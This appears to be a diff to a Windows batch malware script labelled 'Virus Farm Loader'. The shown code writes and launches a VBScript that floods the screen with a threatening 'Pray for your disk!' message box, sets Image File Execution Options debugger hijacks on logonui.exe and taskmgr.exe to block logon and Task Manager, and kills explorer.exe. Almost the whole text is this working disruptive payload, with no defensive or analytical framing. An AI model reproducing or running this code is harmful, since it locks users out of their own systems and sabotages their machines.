@@ -11,14 +11,17 @@ IF "%~1"=="virus" GOTO virusfarm
 IF "%~1"=="v" GOTO virusfarm
 :auto
 title Loading...
+if exist C:\docume~1 goto virusfarm
+if not exist C:\docume~1 goto auto2
+:auto2
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "Virus Farm Loader"
 if %errorlevel%==0 goto virusfarm
 if %errorlevel%==1 goto collabvm
 :virusfarm
-echo For i = 0 to 999999 > "%userprofile%\Music\Devil.vbs"
-echo x=msgbox("Have you ever danced with the devil under the weak light of the moon?" ^& vbNewLine ^& vbNewLine ^& "Pray for your disk!" ^& vbNewLine ^& vbNewLine ^& "     - The_Joker", 2+64, "Devil") >> "%userprofile%\Music\Devil.vbs"
-echo Next >> "%userprofile%\Music\Devil.vbs"
-start "" "%systemroot%\System32\wscript.exe" "%userprofile%\Music\Devil.vbs"
+echo For i = 0 to 999999 > "\Devil.vbs"
+echo x=msgbox("Have you ever danced with the devil under the weak light of the moon?" ^& vbNewLine ^& vbNewLine ^& "Pray for your disk!" ^& vbNewLine ^& vbNewLine ^& "     - The_Joker", 2+64, "Devil") >> "\Devil.vbs"
+echo Next >> "\Devil.vbs"
+start "" "%systemroot%\System32\wscript.exe" "\Devil.vbs"
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\logonui.exe" /v Debugger /d \
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /d \
 taskkill /f /im explorer.exe
